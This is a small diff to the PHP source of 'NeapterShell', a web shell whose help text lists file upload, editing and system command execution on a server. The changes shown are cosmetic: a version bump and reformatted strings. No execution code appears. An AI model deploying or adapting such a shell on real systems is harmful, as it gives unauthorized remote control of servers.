@@ -20,7 +20,7 @@ require_once dirname( __FILE__ ) . '/Lib/LoadModules.php';
  * @author    Krzysztof Otręba <krzotr@gmail.com>
  * @copyright Copyright (c) 2011, Krzysztof Otręba
  *
- * @version 0.40
+ * @version 0.41
  *
  * @uses Arr
  * @uses Request
@@ -36,14 +36,7 @@ class Shell
 	/**
 	 * Help, natywne polecenia
 	 */
-	const HELP = '
-help - Wyświetlanie pomocy
-modules - Informacje o modułach
-edit - Edycja oraz tworzenie nowego pliku
-upload - Wrzucanie pliku na serwer
-system, exec - Uruchomienie polecenia systemowego
-info - Wyświetla informacje o systemie
-logout - Wylogowanie';
+	const HELP = "help - Wyświetlanie pomocy\r\nmodules - Informacje o modułach\r\nedit - Edycja oraz tworzenie nowego pliku\r\nupload - Wrzucanie pliku na serwer\r\nsystem, exec - Uruchomienie polecenia systemowego\r\ninfo - Wyświetla informacje o systemie\r\nlogout - Wylogowanie";
 
 	/**
 	 * Dane do uwierzytelniania, jezeli wartosc jest rowna NULL, to shell nie jest chroniony haslem
@@ -1448,8 +1441,7 @@ DATA;
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'NeapterShell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
-return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
-<div id=\"body\">" .
+return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body><div id=\"body\">" .
 ( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
 "<div id=\"content\">{$sData}</div></div>" .
 ( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
